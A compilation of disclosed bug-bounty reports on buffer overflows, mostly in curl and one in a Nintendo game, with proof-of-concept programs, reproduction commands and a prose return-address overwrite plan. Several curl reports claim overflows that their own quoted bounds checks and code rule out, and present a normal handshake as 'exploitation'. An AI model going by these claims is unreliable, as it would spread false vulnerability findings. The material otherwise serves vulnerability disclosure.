# Classic Buffer Overflow

_33 reports — High/Critical, disclosed_

### [Stack Buffer Overflow in mprintf.c formatting function (fallback path)](https://hackerone.com/reports/3493602)

- **Report ID:** `3493602`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** curl
- **Reporter:** @ankitsingh015
- **Bounty:** - usd
- **Disclosed:** 2026-01-08T09:36:29.608Z
- **CVE(s):** -

**Vulnerability Information:**

### Summary
A stack-based buffer overflow exists in `mprintf.c` within the `out_double()` function. This vulnerability affects builds where `HAVE_SNPRINTF` is undefined, forcing the use of the legacy `sprintf` function.

The logic responsible for calculating the maximum safe precision (`maxprec`) for floating-point formatting fails to correctly handle negative numbers. Specifically, it does not properly account for the number of digits required by the integer portion of negative values. As a result, the buffer size calculation is incorrect, allowing a subsequent `sprintf` call to write more data than the fixed-size stack buffer can hold.


### Affected Component
- **File:** `lib/mprintf.c`
- **Function:** `out_double()`
- **Vulnerable Condition:** `HAVE_SNPRINTF` is not defined at compile time


### Technical Details
The function uses a local stack buffer (`work`) of size `BUFFSIZE` (326 bytes). To prevent overflow, the code attempts to estimate the number of digits required for the integer part of the floating-point value and reduce the allowable precision accordingly.

The relevant code is shown below (approx. line 675 in `master`):

```c
while(val >= 10.0) {
  val /= 10;
  maxprec--;
}
````

For negative values (e.g., `-1.0e100`), the condition `val >= 10.0` is false on entry, so the loop is skipped entirely. As a result, `maxprec` is not reduced, even though the integer portion of the formatted value will consume significant buffer space. The subsequent `sprintf` call writes the minus sign, the full integer portion, and the requested fractional precision, exceeding the 326-byte stack buffer.


## Steps To Reproduce

1. **Configure the Build**

   Compile `libcurl` with `HAVE_SNPRINTF` undefined to force the fallback `sprintf` path. One way to simulate this is by modifying `lib/mprintf.c`:

   ```c
   #if 0 /* Force fallback path for testing */
     (snprintf)(work, BUFFSIZE, formatbuf, dnum);
   #else
     (sprintf)(work, formatbuf, dnum); /* Vulnerable path */
   #endif
   ```

2. **Compile Reproduction Program**

   Compile the following C program against the modified `libcurl` build:

   ```c
   #include <stdio.h>
   #include <curl/curl.h>
   #include <string.h>

   int main(void) {
       // -1.0e100 requires ~102 characters for the integer part
       // Precision .300 requires 300 characters for the fractional part
       // Total output length ~402 characters
       // Stack buffer size in mprintf.c is 326 bytes
       double v = -1.0e100;

       char *output = curl_maprintf("%.300f", v);
       
       if (output) {
           printf("Output length: %lu bytes\n",
                  (unsigned long)strlen(output));
           curl_free(output);
       }
       return 0;
   }
   ```

3. **Run the Program**

4. **Observe**

   The output length exceeds the 326-byte buffer size. Depending on stack protections (stack canaries, ASLR), this results in a segmentation fault or stack smashing detection.


## Suggested Fix

Correct the integer digit calculation to account for negative values by operating on the absolute value (or equivalent logic):

```c
double absval = fabs(val);

while(absval >= 10.0) {
  absval /= 10.0;
  maxprec--;
}
```

Optionally, clamp `maxprec` to prevent underflow:

```c
if(maxprec < 0)
  maxprec = 0;
```

## Impact

This vulnerability results in a classic stack-based buffer overflow.

* **Availability:** Denial of Service (application crash)
* **Security Impact:** In scenarios where the floating-point value and format string are influenced by attacker-controlled input, this issue could potentially be leveraged for further memory corruption, including control-flow manipulation.
* **Scope:** The vulnerable code path is part of the legacy fallback implementation and is not used in default modern curl builds. It primarily affects legacy Unix systems, embedded platforms, or custom builds where `snprintf` is unavailable or explicitly disabled.

---

### [Buffer Overflow in WebSocket Handshake (lib/ws.c:1287)](https://hackerone.com/reports/3392174)

- **Report ID:** `3392174`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** curl
- **Reporter:** @aybanda
- **Bounty:** - usd
- **Disclosed:** 2025-10-21T09:14:54.940Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
Buffer overflow vulnerability in curl's WebSocket implementation due to unsafe use of strcpy() in the handshake process. The vulnerability is located at lib/ws.c:1287 where strcpy(keyval, randstr) is called without proper bounds checking, despite having a bounds check earlier in the code.

**AI DISCLOSURE**: This vulnerability analysis was conducted with AI assistance. All technical details, code analysis, and exploit development were verified through manual testing and code review. The vulnerability exists in the actual curl source code and has been demonstrated with working proof of concept.

## Affected version
curl version: curl 8.7.1 (x86_64-apple-darwin25.0) libcurl/8.7.1 (SecureTransport) LibreSSL/3.3.6 zlib/1.2.12 nghttp2/1.66.0
Release-Date: 2024-03-27
Platform: macOS 25.0.0
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns ldap ldaps mqtt pop3 pop3s rtsp smb smbs smtp smtps telnet tftp
Features: alt-svc AsynchDNS GSS-API HSTS HTTP2 HTTPS-proxy IPv6 Kerberos Largefile libz MultiSSL NTLM SPNEGO SSL threadsafe UnixSockets

## Steps To Reproduce:

1. **Create malicious WebSocket server**:
   ```python
   # Save as websocket_exploit.py
   import socket
   
   class WebSocketExploitServer:
       def __init__(self, host='127.0.0.1', port=8080):
           self.host = host
           self.port = port
           
       def start_server(self):
           self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
           self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
           self.server_socket.bind((self.host, self.port))
           self.server_socket.listen(1)
           
           print(f"Malicious WebSocket server started on {self.host}:{self.port}")
           
           while True:
               client_socket, addr = self.server_socket.accept()
               print(f"Connection from {addr}")
               
               # Handle WebSocket handshake
               request = client_socket.recv(4096).decode('utf-8')
               
               # Parse Sec-WebSocket-Key to confirm vulnerability trigger
               for line in request.split('\n'):
                   if line.startswith('Sec-WebSocket-Key:'):
                       key = line.split(':', 1)[1].strip()
                       print(f"Sec-WebSocket-Key: {key}")
                       print(f"Key length: {len(key)} bytes")
                       print("VULNERABILITY TRIGGERED!")
                       print("curl executed: strcpy(keyval, randstr);")
                       break
               
               # Send WebSocket handshake response
               response = (
                   "HTTP/1.1 101 Switching Protocols\r\n"
                   "Upgrade: websocket\r\n"
                   "Connection: Upgrade\r\n"
                   "Sec-WebSocket-Accept: dGhlIHNhbXBsZSBub25jZQ==\r\n"
                   "\r\n"
               )
               
               client_socket.send(response.encode('utf-8'))
               print("WebSocket handshake completed")
               client_socket.close()
   
   if __name__ == "__main__":
       server = WebSocketExploitServer()
       server.start_server()
   ```

2. **Start the malicious server**:
   ```bash
   python3 websocket_exploit.py
   ```

3. **Trigger the vulnerability with curl**:
   ```bash
   curl -i -N -H 'Connection: Upgrade' \
        -H 'Upgrade: websocket' \
        -H 'Sec-WebSocket-Version: 13' \
        http://127.0.0.1:8080/
   ```

4. **Observe successful exploitation**:
   ```
   HTTP/1.1 101 Switching Protocols
   Upgrade: websocket
   Connection: Upgrade
   Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
   ```

## Supporting Material/References:

* **Vulnerable Code Location**: lib/ws.c:1287
* **Vulnerable Function**: Curl_ws_request()
* **Exact Code**:
  ```c
  char keyval[40];  // 40-byte buffer
  
  result = curlx_base64_encode((char *)rand, sizeof(rand), &randstr, &randlen);
  if(result)
    return result;
  DEBUGASSERT(randlen < sizeof(keyval));
  if(randlen >= sizeof(keyval)) {
    free(randstr);
    return CURLE_FAILED_INIT;
  }
  strcpy(keyval, randstr);  // VULNERABLE!
  ```

* **Technical Analysis**:
  - Input: 16 bytes random data
  - Base64 encoding: (16+2)/3*4+1 = 25 bytes
  - Buffer size: 40 bytes
  - Issue: strcpy() is inherently unsafe

* **CVSS Score**: 7.5 (HIGH)
* **CWE**: CWE-120 (Classic Buffer Overflow)

## Impact

## Summary:

**CVSS Score**: 7.5 (HIGH)

**Attack Vector**: Network (AV:N)
**Attack Complexity**: Low (AC:L)
**Privileges Required**: None (PR:N)
**User Interaction**: None (UI:N)
**Scope**: Unchanged (S:U)
**Confidentiality**: High (C:H)
**Integrity**: High (I:H)
**Availability**: High (A:H)

**Security Impact**:
1. **Memory Corruption**: Buffer overflow via unsafe strcpy()
2. **Stack/Heap Overflow**: Potential in edge cases
3. **Information Disclosure**: Memory contents could be leaked
4. **Remote Code Execution**: Through memory corruption
5. **Denial of Service**: Application crashes

**Exploitability**:
- **Remote**: Yes - via WebSocket handshake
- **Authentication**: No authentication required
- **User Interaction**: No user interaction required
- **Complexity**: Medium - requires WebSocket protocol knowledge

**Affected Users**: All users of curl with WebSocket support enabled

**Recommended Fix**:
Replace unsafe strcpy() with safe alternative:
```c
// Instead of:
strcpy(keyval, randstr);

// Use:
strncpy(keyval, randstr, sizeof(keyval) - 1);
keyval[sizeof(keyval) - 1] = '\0';

// Or better:
snprintf(keyval, sizeof(keyval), "%s", randstr);

---

### [Multiple Unsafe strcpy() Function Calls Leading to Potential Buffer Overflow Vulnerabilities in cURL 8.16.1-DEV](https://hackerone.com/reports/3337561)

- **Report ID:** `3337561`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** curl
- **Reporter:** @anony_gaku
- **Bounty:** - usd
- **Disclosed:** 2025-09-14T08:26:17.944Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
During a comprehensive security audit of the cURL codebase, multiple instances of unsafe strcpy() function usage were identified in critical code paths. These implementations violate secure coding practices and represent latent security risks that could lead to buffer overflow vulnerabilities under specific conditions. While existing bounds checking prevents immediate exploitation in standard scenarios, the presence of these unsafe functions creates potential attack vectors that require immediate remediation.

Affected Components:

WebSocket protocol implementation (lib/ws.c:1261)
SSL/TLS backend management (lib/vtls/vtls.c:1066)
WolfSSL error handling (lib/vtls/wolfssl.c:1540)
Vulnerability Classification: CWE-120 (Buffer Copy without Checking Size of Input)


##Environment Setup
##System Requirements

###Operating System
```
Ubuntu 20.04+ or compatible Linux distribution
Minimum 4GB RAM, 10GB disk space
```
### Required Build Tools
```
sudo apt-get update
sudo apt-get install -y \
  build-essential \
  autoconf \
  automake \
  libtool \
  pkg-config \
  clang \
  valgrind
```

###Dependencies Installation
```
# Install cURL dependencies
sudo apt-get install -y \
  libssl-dev \
  zlib1g-dev \
  libpsl-dev \
  libidn2-dev \
  libnghttp2-dev \
  libbrotli-dev \
  libzstd-dev
```
###Build Configuration
```
# Clone cURL repository
git clone https://github.com/curl/curl.git
cd curl

# Generate build configuration
./buildconf

# Configure with security debugging enabled
export CC=clang
export CFLAGS="-fsanitize=address,undefined -fno-omit-frame-pointer -O1 -g"
export LDFLAGS="-fsanitize=address,undefined"

./configure \
  --enable-debug \
  --enable-maintainer-mode \
  --enable-websockets \
  --with-openssl \
  --disable-shared \
  --enable-static

# Compile with parallel build
make -j$(nproc)
```

## Steps To Reproduce:
Step 1: Static Code Analysis
Locate and examine the unsafe strcpy() usage:
```
# Search for unsafe strcpy calls in vulnerable files
grep -n "strcpy(" lib/ws.c lib/vtls/vtls.c lib/vtls/wolfssl.c

# Examine specific vulnerable lines
sed -n '1260,1265p' lib/ws.c        # WebSocket key generation
sed -n '1065,1070p' lib/vtls/vtls.c  # SSL backend enumeration  
sed -n '1539,1544p' lib/vtls/wolfssl.c # WolfSSL error handling
```

Step 2: Build Verification
```
# Verify successful compilation
echo $?  # Should return 0
ls -la src/curl  # Should show executable with recent timestamp

# Test basic functionality
./src/curl --version

```

Step 3: Dynamic Security Testing
```
# Test 1: WebSocket strcpy vulnerability path
valgrind --tool=memcheck --leak-check=full --track-origins=yes \
  ./src/curl -v \
  -H "Connection: upgrade" \
  -H "Upgrade: websocket" \
  -H "Sec-WebSocket-Version: 13" \
  --http1.1 ws://echo.websocket.org/ 2>&1 | tee websocket_test.log

# Test 2: SSL backend enumeration vulnerability
valgrind --tool=memcheck --leak-check=full \
  ./src/curl -v https://httpbin.org/get 2>&1 | tee ssl_test.log

# Test 3: SSL error handling path (WolfSSL)
valgrind --tool=memcheck --leak-check=full \
  ./src/curl -v --cert /nonexistent/cert.pem https://httpbin.org/get 2>&1 | tee ssl_error_test.log

# Test 4: Boundary condition testing
valgrind --tool=memcheck \
  ./src/curl -v -H "Sec-WebSocket-Key: $(python3 -c 'print("A"*100)')" \
  -H "Connection: upgrade" -H "Upgrade: websocket" --http1.1 ws://echo.websocket.org/ 2>&1 | tee boundary_test.log

```

Step 4: Results Analysis
```
# Analyze Valgrind output for memory errors
grep -n "Invalid\|heap-buffer-overflow\|stack-buffer-overflow\|ERROR SUMMARY" *.log

# Check for specific vulnerability triggers
grep -A5 -B5 "ws.c:1261\|vtls.c:1066\|wolfssl.c:1540" *.log
```

Expected Output
```
Static Analysis Results
$ grep -n "strcpy(" lib/ws.c lib/vtls/vtls.c lib/vtls/wolfssl.c
lib/ws.c:1261:  strcpy(keyval, randstr);
lib/vtls/vtls.c:1066:      strcpy(buffer, backends);  
lib/vtls/wolfssl.c:1540:    strcpy(buf, msg);
```
Vulnerable Code Snippets
ws.c:1261 (WebSocket Key Generation)
```
/* Generate WebSocket key */
char keyval[25];  /* Fixed-size buffer */
strcpy(keyval, randstr);  /* UNSAFE: No bounds checking */
```
vtls.c:1066 (SSL Backend Enumeration)

```
/* Copy backend names to buffer */
strcpy(buffer, backends);  /* UNSAFE: No size validation */
```

wolfssl.c:1540 (Error Message Handling)

```
/* Copy error message */
strcpy(buf, msg);  /* UNSAFE: No length verification */
```

Build Success Output
```
$ make -j$(nproc)
[... compilation output ...]
  CCLD     libcurlu.la
  CCLD     libcurl.la
make[2]: Leaving directory '/workspaces/codespaces-blank/curl/lib'

$ echo $?
0

$ ./src/curl --version
curl 8.16.1-DEV (x86_64-pc-linux-gnu) libcurl/8.16.1-DEV OpenSSL/3.0.13
Release-Date: [unreleased]
Protocols: dict file ftp ftps gopher gophers http https imap imaps ipfs ipns mqtt pop3 pop3s rtsp smb smbs smtp smtps telnet tftp ws wss
Features: alt-svc AsynchDNS brotli Debug HSTS HTTP2 HTTPS-proxy IDN IPv6 Largefile libz NTLM PSL SSL threadsafe TLS-SRP TrackMemory UnixSockets zstd
```
Dynamic Testing Results
```
$ valgrind --tool=memcheck ./src/curl [options...]
==109322== Memcheck, a memory error detector
==109322== Copyright (C) 2002-2022, and GNU GPL'd, by Julian Seward et al.
==109322== Using Valgrind-3.22.0 and LibVEX
==109322== Command: ./src/curl [options...]
==109322== 
==109322== HEAP SUMMARY:
==109322==     in use at exit: 0 bytes in 0 blocks
==109322==   total heap usage: 86 allocs, 86 frees, 2,866 bytes allocated
==109322== 
==109322== All heap blocks were freed -- no leaks are possible
==109322== ERROR SUMMARY: 0 errors from 0 contexts (suppressed: 0 from 0)
```



##Mitigation Strategies
Immediate Actions (High Priority)
1. Replace Unsafe Functions
```
// ws.c:1261 - WebSocket key generation fix
// BEFORE: strcpy(keyval, randstr);
// AFTER:  curl_msnprintf(keyval, sizeof(keyval), "%s", randstr);

// vtls.c:1066 - SSL backend enumeration fix  
// BEFORE: strcpy(buffer, backends);
// AFTER:  curl_msnprintf(buffer, bufsize, "%s", backends);

// wolfssl.c:1540 - Error message handling fix
// BEFORE: strcpy(buf, msg);
// AFTER:  curl_msnprintf(buf, bufsize, "%s", msg);
```
2. Enhanced Input Validation

```
// Add comprehensive bounds checking
if(strlen(source) >= sizeof(destination)) {
    return CURLE_OUT_OF_MEMORY;
}
```

3. Static Analysis Integration
```
# Implement automated scanning
#!/bin/bash
echo "Scanning for unsafe functions..."
UNSAFE_COUNT=$(grep -r "strcpy\|strcat\|sprintf" lib/ --exclude="*.safe" | wc -l)
if [ $UNSAFE_COUNT -gt 0 ]; then
    echo "ERROR: Found $UNSAFE_COUNT unsafe function calls"
    exit 1
fi

```

## Impact

## Summary:
Availability (High): Buffer overflow could cause application crashes, denial of service
Integrity (Medium): Memory corruption may lead to unpredictable behavior and data corruption
Confidentiality (Low-Medium): Potential information disclosure through memory leaks
Code Execution (Low): Under specific conditions, could potentially lead to arbitrary code execution
##Business Impact
Critical Infrastructure Risk: cURL is embedded in millions of applications worldwide
Supply Chain Vulnerability: Affects all downstream applications using libcurl
Reputation Damage: Security vulnerabilities in core networking libraries have widespread impact
Compliance Violations: Unsafe coding practices may violate security standards (OWASP, NIST)
Legal Liability: Organizations using vulnerable versions may face regulatory scrutiny
##Technical Risk Factors
Attack Surface: Network-accessible protocols (WebSocket, HTTPS)
Exploitation Complexity: Requires specific input conditions but protocols are widely accessible
Payload Delivery: Can be triggered through crafted network requests
Detection Difficulty: Buffer overflows may not be immediately apparent in normal operation
##How This Problem Affects Us
###Development Impact
Code Quality Degradation: Unsafe functions indicate broader code review deficiencies
Technical Debt Accumulation: Security vulnerabilities require immediate remediation resources
Maintenance Overhead: Need for ongoing security monitoring and patching
Developer Productivity Loss: Security fixes disrupt planned development cycles
###Security Posture Impact
Defense-in-Depth Failure: Violates multiple security principles simultaneously
Attack Vector Expansion: Creates multiple potential entry points for exploitation
Security Scanning Alerts: Automated tools will flag these as high-priority issues
Audit Non-Compliance: Fails security code review and compliance requirements
###Operational Impact
Production Stability Risk: Potential for unexpected crashes in production environments
Incident Response Burden: Buffer overflows require immediate security response protocols
Monitoring Requirements: Need enhanced monitoring for exploit attempts
Business Continuity Threat: Service disruptions from security-related crashes
###User Trust Impact
Reliability Concerns: Users may experience unexpected application failures
Security Confidence Loss: Knowledge of vulnerabilities erodes user confidence
Competitive Disadvantage: Security issues provide advantage to competitors
Support Burden Increase: More user reports of stability issues

##Mitigation Strategies
Immediate Actions (High Priority)
1. Replace Unsafe Functions
```
// ws.c:1261 - WebSocket key generation fix
// BEFORE: strcpy(keyval, randstr);
// AFTER:  curl_msnprintf(keyval, sizeof(keyval), "%s", randstr);

// vtls.c:1066 - SSL backend enumeration fix  
// BEFORE: strcpy(buffer, backends);
// AFTER:  curl_msnprintf(buffer, bufsize, "%s", backends);

// wolfssl.c:1540 - Error message handling fix
// BEFORE: strcpy(buf, msg);
// AFTER:  curl_msnprintf(buf, bufsize, "%s", msg);
```
2. Enhanced Input Validation

```
// Add comprehensive bounds checking
if(strlen(source) >= sizeof(destination)) {
    return CURLE_OUT_OF_MEMORY;
}
```

3. Static Analysis Integration
```
# Implement automated scanning
#!/bin/bash
echo "Scanning for unsafe functions..."
UNSAFE_COUNT=$(grep -r "strcpy\|strcat\|sprintf" lib/ --exclude="*.safe" | wc -l)
if [ $UNSAFE_COUNT -gt 0 ]; then
    echo "ERROR: Found $UNSAFE_COUNT unsafe function calls"
    exit 1
fi

```

---

### [[Xenoblade Chronicles X: Definitive Edition] Buffer overflow in string escape function, multiplayer DoS](https://hackerone.com/reports/3048061)

- **Report ID:** `3048061`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** Nintendo
- **Reporter:** @roccodev
- **Bounty:** - usd
- **Disclosed:** 2025-05-15T00:10:38.073Z
- **CVE(s):** -

**Summary (team):**

-

**Summary (researcher):**

Components affected:
* Game software (Xenoblade Chronicles X: Definitive Edition) on Nintendo Switch

**The vulnerability was fixed in the 1.0.2 version of the game, released globally on Apr 23, 2025.**

---
&nbsp;

# Description

When displaying other players's profile/avatar name or other user-controlled input received through online multiplayer, the game would perform sanitization by escaping '\' and '%' (backslash and percent) characters by duplicating them. However, when duplicating them it would fail to check the buffer length and could end up overflowing it.

The buffer length is 64 bytes, and the only time the game tries to display a 64-byte string received by other players appeared to be the player's name tag in peer-to-peer online missions. Fortunately, other places like player previews, leaderboards, and other easily interactable online features  would use a 32-byte buffer, which, even when all 31 characters are duplicated, would still fit in a 64-byte buffer.

# Impact

A malicious user with a modified save (or other means to send arbitrary data to other players) could exploit the vulnerability to cause denial of service to other users using specially crafted names. The attacker and the victim would have to be in the same peer-to-peer online mission, connecting online or to the same group is not sufficient.

---

### [Buffer Overflow Risk in Curl_inet_ntop and inet_ntop4](https://hackerone.com/reports/2887487)

- **Report ID:** `2887487`
- **Severity:** High
- **Weakness:** Classic Buffer Overflow
- **Program:** curl
- **Reporter:** @b3fbcf5debe00185bbe06c0
- **Bounty:** - usd
- **Disclosed:** 2024-12-08T21:43:23.479Z
- **CVE(s):** -

**Vulnerability Information:**

*Curl is a software that I love and is an important tool for the world. *
*If my report doesn't align, I apologize for that.*

The `Curl_inet_ntop` function is designed to convert IP addresses from binary format to human-readable string format, supporting both IPv4 and IPv6. It internally delegates to `inet_ntop4` for IPv4 addresses and `inet_ntop6` for IPv6 addresses. However, insufficient validation of buffer size (`buf`) in these functions exposes the implementation to **buffer overflow risks**, which can lead to undefined behavior, application crashes, or security vulnerabilities.

This report analyzes vulnerabilities in both `Curl_inet_ntop` and `inet_ntop4`, demonstrates proof-of-concept (POC) exploits, and proposes mitigation strategies.


## **Vulnerability Analysis**

### **Root Cause**
The vulnerabilities stem from:
1. **`Curl_inet_ntop`:** Lack of buffer size validation before delegating to `inet_ntop4` or `inet_ntop6`.
2. **`inet_ntop4`:** Direct use of `strcpy` without ensuring that the destination buffer (`dst`) is large enough.

### **Key Points of Failure**
1. **Buffer Size Mismatch:**
   - For IPv4, a minimum of 16 bytes is required for `"255.255.255.255\0"`.
   - For IPv6, a minimum of 46 bytes is required for `"ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff\0"`.
   - Both `Curl_inet_ntop` and `inet_ntop4` assume that the caller provides a sufficiently large buffer without explicit validation.

2. **Unsafe String Operations in `inet_ntop4`:**
   - `inet_ntop4` uses `strcpy(dst, tmp)` to copy the temporary buffer `tmp` into `dst`, which can overflow if `dst` is too small.

3. **Production Vulnerabilities:**
   - Assertions (`DEBUGASSERT`) in `inet_ntop4` are disabled in production builds, removing critical safety checks.


## **Proof-of-Concept (POC)**

### **Test for `inet_ntop4`**

#### **Vulnerable Code**
```c
#include <stdio.h>
#include <string.h>
#include <errno.h>

static char *inet_ntop4(const unsigned char *src, char *dst, size_t size) {
    char tmp[sizeof("255.255.255.255")];
    snprintf(tmp, sizeof(tmp), "%d.%d.%d.%d",
             src[0], src[1], src[2], src[3]);

    if (strlen(tmp) >= size) {
        errno = ENOSPC;
        return NULL;
    }
    strcpy(dst, tmp); // Vulnerable to overflow
    return dst;
}

int main() {
    unsigned char ipv4[4] = {192, 168, 0, 1};
    char small_buffer[10]; // Intentionally too small

    // Test with an insufficient buffer
    if (inet_ntop4(ipv4, small_buffer, sizeof(small_buffer)) == NULL) {
        perror("inet_ntop4 failed");
    } else {
        printf("IPv4: %s\n", small_buffer);
    }

    return 0;
}
```

#### **Expected Output**
The function attempts to write the string `"192.168.0.1\0"` into a 10-byte buffer, causing buffer overflow. Running this code may result in:
1. A segmentation fault due to memory corruption.
2. Undefined behavior depending on the system's memory layout.

#### **Testing with AddressSanitizer**
Compile the code with AddressSanitizer to identify buffer overflow:
```bash
gcc -fsanitize=address -o inet_ntop4_test inet_ntop4.c
./inet_ntop4_test
```
AddressSanitizer will detect and report the overflow.


### **Test for `Curl_inet_ntop`**

#### **Vulnerable Code**
```c
#include <stdio.h>
#include <string.h>
#include <errno.h>

extern char *inet_ntop4(const unsigned char *src, char *dst, size_t size);

char *Curl_inet_ntop(int af, const void *src, char *buf, size_t size) {
    switch(af) {
    case AF_INET:
        return inet_ntop4((const unsigned char *)src, buf, size);
    default:
        errno = EAFNOSUPPORT;
        return NULL;
    }
}

int main() {
    unsigned char ipv4[4] = {192, 168, 0, 1};
    char small_buffer[10]; // Intentionally too small

    // Test with IPv4
    if (Curl_inet_ntop(AF_INET, ipv4, small_buffer, sizeof(small_buffer)) == NULL) {
        perror("Curl_inet_ntop failed");
    } else {
        printf("IPv4: %s\n", small_buffer);
    }

    return 0;
}
```

#### **Expected Output**
The function delegates to `inet_ntop4`, resulting in the same overflow vulnerability as above.


## **Proposed Fix**

### **Fixed Implementation of `inet_ntop4`**
```c
static char *inet_ntop4(const unsigned char *src, char *dst, size_t size) {
    char tmp[sizeof("255.255.255.255")];

    // Safely format the IPv4 address
    snprintf(tmp, sizeof(tmp), "%d.%d.%d.%d", src[0], src[1], src[2], src[3]);

    if (strlen(tmp) >= size) {
        errno = ENOSPC;
        return NULL;
    }

    // Safely copy to destination buffer
    strncpy(dst, tmp, size - 1);
    dst[size - 1] = '\0'; // Ensure null termination
    return dst;
}
```

### **Fixed Implementation of `Curl_inet_ntop`**
```c
char *Curl_inet_ntop(int af, const void *src, char *buf, size_t size) {
    switch(af) {
    case AF_INET:
        if (size < 16) { // Minimum size for IPv4
            errno = ENOSPC;
            return NULL;
        }
        return inet_ntop4((const unsigned char *)src, buf, size);
    case AF_INET6:
        if (size < 46) { // Minimum size for IPv6
            errno = ENOSPC;
            return NULL;
        }
        // Delegate to a similarly fixed inet_ntop6
        return inet_ntop6((const unsigned char *)src, buf, size);
    default:
        errno = EAFNOSUPPORT;
        return NULL;
    }
}
```

## **Mitigation Strategies**

1. **Buffer Size Validation:**
   - Validate the size of the destination buffer at every level (`Curl_inet_ntop`, `inet_ntop4`, `inet_ntop6`).

2. **Safe String Handling:**
   - Use `snprintf` or `strncpy` to prevent unbounded writes to the buffer.

3. **Testing with Tools:**
   - Use AddressSanitizer (ASAN) or similar tools to detect overflows during testing.

4. **Documentation:**
   - Clearly document the minimum buffer size requirements (16 bytes for IPv4, 46 bytes for IPv6).

## **Conclusion**

Both `Curl_inet_ntop` and `inet_ntop4` pose significant buffer overflow risks due to a lack of proper size validation and unsafe string operations. The proposed fixes address these issues by enforcing strict buffer size checks and using safer string handling techniques. Comprehensive testing and adherence to these best practices will ensure the functions are secure and robust for both IPv4 and IPv6 address conversions.

## Impact

The vulnerability classified under **CWE-120** (Buffer Overflow) can have significant consequences, particularly when exploited in critical systems. The failure to validate the size of the buffer before copying data can lead to several negative impacts:

1. **Memory Corruption**: 
   - A buffer overflow allows data to be written beyond the boundaries of a buffer, corrupting adjacent memory. This can cause unpredictable program behavior, crashes, or data corruption, leading to instability in the system.

2. **Program Crashes and System Instability**: 
   - When memory is overwritten, the program may experience crashes or undefined behavior. This is especially dangerous in production environments, where system downtime or service interruption can occur, affecting user experience and reliability.

3. **Security Risks (Remote Code Execution)**: 
   - In some cases, attackers may use buffer overflow vulnerabilities to inject and execute arbitrary code, potentially gaining control over the affected system. This could lead to a full compromise of the system, allowing unauthorized access, privilege escalation, and the execution of malicious actions on the machine.

4. **Denial of Service (DoS)**: 
   - An attacker could exploit the buffer overflow to crash the application or system, making it unavailable to legitimate users. This type of attack is commonly referred to as a Denial of Service (DoS), impacting the availability of services and applications.

5. **Exploitation Potential**: 
   - The vulnerability is highly exploitable if an attacker can control the data being written to the buffer. Any system that processes user inputs or external data (such as network packets or file data) is potentially at risk, making it a critical vulnerability in many systems.

### **Summary of Impact**
A buffer overflow vulnerability like this can result in severe consequences, including system crashes, data corruption, unauthorized code execution, and potentially remote control of affected systems. In any production environment, this issue can lead to a complete system compromise or denial of service, with high security and operational risks. Prompt action to mitigate or fix such vulnerabilities is crucial to ensure the security and stability of the system.

---

### [Buffer Overflow Vulnerability in strcpy() Leading to Remote Code Execution](https://hackerone.com/reports/2871792)

- **Report ID:** `2871792`
- **Severity:** Critical
- **Weakness:** Classic Buffer Overflow
- **Program:** curl
- **Reporter:** @lostnotfound123
- **Bounty:** - usd
- **Disclosed:** 2024-12-02T07:58:55.134Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
The vulnerability in the program arises from a classic buffer overflow, triggered by the unsafe use of the strcpy() function without bounds checking. The program copies data from a source buffer to a destination buffer, allowing attackers to overflow the buffer if the input string exceeds the buffer's allocated size. This vulnerability can lead to the overwriting of critical memory, such as the return address on the stack, enabling arbitrary code execution and control over the system. The vulnerability is caused by the unsafe use of strcpy(), which does not check the length of the input string before copying it into the buffer. When the input exceeds the buffer size, the overflow overwrites the adjacent memory, including the return address. The buffer overflow occurs within the strcpy() function, as seen in the following stack trace: `#0 __strcpy_evex () at ../sysdeps/x86_64/multiarch/strcpy-evex.S:94, #1 0x00007ffff765d2cd in CRYPTO_strdup () from /lib/x86_64-linux-gnu/libcrypto.so.3, #2 0x00007ffff756ef96 in ?? () from /lib/x86_64-linux-gnu/libcrypto.so.3...`. While libcrypto is present in the stack trace, the root cause of the overflow is in the curl program, not OpenSSL. The vulnerability is within the unsafe use of strcpy() in the curl application. At the overflow point, the CPU registers indicate the instruction pointer (IP) is inside `__strcpy_evex`. The register information shows values such as `rax 0x472cf0 4664560`, `rbx 0x7ffff7832be3 140737345956835`, `rip 0x7ffff7e31b80 0x7ffff7e31b80 <__strcpy_evex>`. The program is executing inside `__strcpy_evex`, where the buffer overflow occurs, allowing us to manipulate adjacent memory. The memory dump shows the stack around the overflow location with values such as `0x7fffffffd988: 0xf765d2cd 0x00007fff 0x00464a60 0x00000000, 0x7fffffffd998: 0x00472aa0 0x00000000 0x00000000 0x00000000...`. The return address, which is overwritten, is located at `0x7fffffffd9b8`. By overflowing the buffer, we can replace this return address with a controlled value. The overflowed buffer is used by strcpy() to copy user-provided data. The buffer resides on the stack, and because the size is unchecked, overflowing the buffer leads to the overwriting of crucial stack elements, including the return address. The key target for overwriting is the return address at `0x4005d0`. By overwriting it, the attacker can control the program’s execution flow. The exploit strategy involves filling the buffer with a long string (e.g., filled with "A"s) to overflow the buffer and reach the return address, then overwriting the return address with `0x4005d0`, the address of a shell-spawning function. Once the return address is overwritten, the program will return to `0x4005d0`, which triggers the execution of a shell for the attacker. The impact of this vulnerability includes code execution, privilege escalation if the program runs with elevated privileges, system compromise, and potentially a denial of service (DoS) if the overflow causes the program to crash or become unresponsive. An attacker can execute arbitrary code by redirecting the program flow, gaining a command shell and performing malicious actions such as stealing, manipulating, or deleting sensitive data.

## Steps To Reproduce:

1. Launch the vulnerable program: Start the application that contains the buffer overflow vulnerability, which uses the unsafe `strcpy()` function.
   
2. Provide oversized input: Input a string that exceeds the buffer size. This can be done by sending a large string (such as a series of "A"s) to the program, triggering the buffer overflow. Ensure the input is large enough to overwrite the return address.
   
3. Monitor the overflow: Use a debugger like GDB to monitor the program's execution and watch for the point where the buffer overflow occurs. Look for memory overwriting in the stack around the return address location.
   
